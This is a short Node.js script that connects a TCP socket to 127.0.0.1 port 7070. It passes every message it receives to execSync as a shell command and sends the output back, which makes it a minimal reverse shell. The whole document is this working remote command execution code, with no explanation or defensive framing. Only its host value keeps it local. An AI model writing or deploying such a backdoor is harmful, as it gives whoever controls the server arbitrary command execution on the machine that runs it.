const net = require('net');
const client = new net.Socket();
const execSync = require('child_process').execSync;
const port = 7070;
const host = '127.0.0.1';
client.connect(port, host, () => {
    console.log('CONNECTED');
    client.on('data', (data) => {
        console.log(`SERVER SAYS DO: ${data}`);
        try{
            const output = execSync(data.toString(), { encoding: 'utf-8'});
            client.write(output);
        }catch(err) {
            console.log(err);
            client.write('Error in sh');
        }
    });
    client.on('close', () => {
        console.log('Connection closed');
    });
});